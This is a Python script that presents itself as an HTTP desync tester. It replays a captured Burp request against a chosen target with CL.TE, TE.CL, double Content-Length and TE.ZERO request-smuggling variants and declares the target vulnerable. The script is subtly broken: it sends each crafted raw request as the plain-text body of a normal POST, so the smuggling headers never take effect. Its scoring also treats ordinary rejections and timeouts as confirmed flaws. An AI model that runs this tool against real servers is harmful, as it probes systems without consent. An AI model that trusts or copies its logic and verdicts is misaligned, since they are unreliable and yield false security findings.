#!/usr/bin/env python3
"""
HTTP Desync Tester - SMART Method Handling (GET/POST/PUT)
Preserves original method, uses method-specific smuggling.

Some test completed on this, seems to be working :P
"""

import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
warnings.filterwarnings("ignore", message=".*NotOpenSSLWarning.*")

import urllib3
urllib3.disable_warnings(urllib3.exceptions.NotOpenSSLWarning)

import argparse
import requests
import time
import re
from urllib.parse import urlparse
import sys

class HTTPDesyncMutator:
    def __init__(self, target_url, burp_file, timeout=30, verbose=False):
        self.target = target_url.rstrip('/')
        self.timeout = timeout
        self.verbose = verbose
        
        with open(burp_file, 'r') as f:
            self.original_request = f.read().rstrip()
        
        self._parse_request()
        self.session = requests.Session()
        
        print(f"🎯 TARGET: {self.target}{self.path}")
        print(f"📄 ORIGINAL METHOD: {self.method}")
        print(f"📏 Body: {len(self.body)}B | Headers: {len(self.headers)}")
    
    def _parse_request(self):
        """Parse preserving original method"""
        lines = self.original_request.split('\n')
        first_line = lines[0].strip()
        parts = first_line.split(' ', 2)
        
        self.method = parts[0].upper()
        self.path = parts[1]
        self.full_url = f"{self.target}{self.path}"
        
        self.headers = {}
        self.body_start = 0
        for i, line in enumerate(lines[1:], 1):
            line = line.rstrip()
            if not line or ':' not in line:
                self.body_start = i
                break
            if line.startswith('#'):
                continue
            try:
                key, value = line.split(':', 1)
                self.headers[key.strip().lower()] = value.strip()
            except:
                continue
        
        self.body = '\n'.join(lines[self.body_start:]).rstrip()
        self.header_lines = [f"{k.title()}: {v}" for k,v in self.headers.items()]
    
    def _build_smuggled_request(self, method=None, desync_headers=[], body_modifier=""):
        """Builds request preserving original method"""
        method = method or self.method
        lines = [f"{method} {self.path} HTTP/1.1"]
        
        # Desync headers FIRST (critical for parsing order)
        for desync_header in desync_headers:
            lines.append(desync_header)
        
        # Original headers
        lines.extend(self.header_lines)
        lines.append("")  # Separator
        
        # Modified body (even for GET)
        lines.append(self.body + body_modifier)
        
        return '\n'.join(lines)
    
    def test_baseline(self):
        """Original request EXACTLY as captured"""
        print("\n" + "="*80)
        print("🧪 BASELINE: Original Burp request (unchanged)")
        print("="*80)
        
        start = time.time()
        headers_dict = {k.title(): v for k,v in self.headers.items()}
        
        r = self.session.request(
            self.method, self.full_url,
            data=self.body if self.method in ['POST', 'PUT', 'PATCH'] else None,
            headers=headers_dict,
            timeout=self.timeout,
            allow_redirects=False
        )
        
        elapsed = time.time() - start
        print(f"✅ {self.method} {r.status_code} | {elapsed:.2f}s | {len(r.content)}B")
        return elapsed, r.status_code
    
    def _detailed_test(self, name, description, desync_headers, body_modifier="", 
                      use_post_fallback=False):
        """Run test with GET-first, POST-fallback strategy"""
        print("\n" + "="*80)
        print(f"🧪 {name}")
        print(f"📝 {description}")
        print("="*80)
        
        # Strategy 1: Try original method first
        smuggled_req = self._build_smuggled_request(
            method=self.method, desync_headers=desync_headers, 
            body_modifier=body_modifier
        )
        
        print(f"🎯 Trying {self.method} smuggling...")
        result = self._execute_and_analyze(smuggled_req)
        
        # Strategy 2: POST fallback if 405 + verbose
        if result.get('status_code') == 405 and use_post_fallback:
            print(f"\n⚡ {self.method} rejected (405), trying POST fallback...")
            post_req = self._build_smuggled_request(
                method='POST', desync_headers=desync_headers, 
                body_modifier=body_modifier
            )
            result = self._execute_and_analyze(post_req)
        
        return result['vulnerable']
    
    def _execute_and_analyze(self, smuggled_req):
        """Execute single request + analyze"""
        start = time.time()
        try:
            r = self.session.post(
                self.target, data=smuggled_req,
                headers={'Content-Type': 'text/plain; charset=utf-8'},
                timeout=self.timeout, allow_redirects=False
            )
            elapsed = time.time() - start
            
            vulnerable = self._analyze_response(r, elapsed)
            self._print_result(r, elapsed, vulnerable)
            return {'status_code': r.status_code, 'vulnerable': vulnerable}
            
        except requests.exceptions.Timeout:
            print("💥 TIMEOUT (>%.0fs) → VULNERABLE!", self.timeout)
            return {'status_code': 'TIMEOUT', 'vulnerable': True}
    
    def _analyze_response(self, r, elapsed):
        """Desync vulnerability scoring"""
        score = 0
        if r.status_code in [400, 403, 413, 414]:
            score += 2  # Proxy/WAF rejection = good
        if elapsed > self.timeout * 0.7:
            score += 2  # Origin hung waiting
        if r.status_code >= 500:
            score += 1
        if len(r.content) < 200:
            score += 1
            
        return score >= 2
    
    def _print_result(self, r, elapsed, vulnerable):
        """Print formatted results"""
        status = r.status_code if isinstance(r.status_code, int) else r.status_code
        emoji = "🚨 VULN!" if vulnerable else "✅ PASS"
        print(f"   {emoji} {status} | {elapsed:.1f}s | {len(r.content)}B")
    
    # === TEST VARIANTS ===
    
    def test_cl_te(self):
        return self._detailed_test(
            "CL.TE CLASSIC",
            "Content-Length:6 then Transfer-Encoding:chunked\nProxy obeys CL=6, origin waits forever on TE",
            ["Content-Length: 6", "Transfer-Encoding: chunked"],
            "\r\n0\r\n\r\n",
            use_post_fallback=True
        )
    
    def test_te_cl(self):
        return self._detailed_test(
            "TE.CL",
            "Transfer-Encoding FIRST + Content-Length:13\nTests reverse header parsing order",
            ["Transfer-Encoding: chunked", "Content-Length: 13"],
            "5\r\nabcde\r\n0\r\n\r\n",
            use_post_fallback=True
        )
    
    def test_double_cl(self):
        return self._detailed_test(
            "DOUBLE CL",
            "Content-Length:6 then Content-Length:200 + TE\nWhich CL does proxy vs origin obey?",
            ["Content-Length: 6", "Content-Length: 200", "Transfer-Encoding: chunked"],
            "\r\n0\r\n\r\n"
        )
    
    def test_te_zero(self):
        return self._detailed_test(
            "TE.ZERO",
            "Transfer-Encoding:chunked + immediate 0-length chunk\nPremature body termination",
            ["Transfer-Encoding: chunked"],
            "0\r\n\r\n"
        )
    
    def run_full_suite(self):
        """Complete test battery"""
        print("🏃 RUNNING FULL DESYNC SUITE...")
        self.test_baseline()
        
        suite = [
            self.test_cl_te,
            self.test_te_cl,
            self.test_double_cl,
            self.test_te_zero
        ]
        
        vulns = sum(test() for test in suite)
        
        print("\n" + "="*80)
        print(f"🎯 SUMMARY: {vulns}/4 tests vulnerable")
        if vulns >= 2:
            print("🔥 CONFIRMED: HTTP Desync Vulnerable!")
        elif vulns == 1:
            print("⚠️  Possible desync - investigate")
        else:
            print("✅ No clear desync indicators")

def main():
    parser = argparse.ArgumentParser(description="HTTP Desync - Smart Method Handling")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("burp_file", help="Burp request file")
    parser.add_argument("-t", "--timeout", type=int, default=30, help="Timeout")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    tester = HTTPDesyncMutator(args.url, args.burp_file, args.timeout, args.verbose)
    tester.run_full_suite()

if __name__ == "__main__":
    main()
